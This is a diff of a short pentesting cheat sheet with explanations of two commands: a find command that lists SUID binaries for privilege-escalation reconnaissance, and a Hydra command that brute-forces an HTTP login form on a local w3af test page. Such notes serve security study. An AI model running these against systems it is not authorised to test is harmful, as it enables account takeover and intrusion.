@@ -1,11 +1,12 @@
 Find all files with SUID bit
 
-find / -perm -u=s -type f 2>/dev/null
+    find / -perm -u=s -type f 2>/dev/null
 
 or
 
-find / -perm -4000 -type f 2>/dev/null
+    find / -perm -4000 -type f 2>/dev/null
 
+Explanation:
 
     /denotes  start from the top (root) of the file system and find every directory
     -permdenotes search for the permissions that follow
@@ -16,10 +17,12 @@ find / -perm -4000 -type f 2>/dev/null
     > means redirection
     /dev/null is a special filesystem object that throws away everything written into it.
 
-hydra 192.168.1.69 http-form-post "/w3af/bruteforce/form_login/dataReceptor.php:user=^USER^&pass=^PASS^:Bad login" -L users.txt -P pass.txt -t 10 -w 30 -o hydra-http-post-attack.txt
 
+Hydra Password Bruteforce
 
-If we break this up
+    hydra 192.168.1.69 http-form-post "/w3af/bruteforce/form_login/dataReceptor.php:user=^USER^&pass=^PASS^:Bad login" -L users.txt -P pass.txt -t 10 -w 30 -o hydra-http-post-attack.txt
+    
+Explanation:
 
     Host = 192.168.1.69
     Method = http-form-post
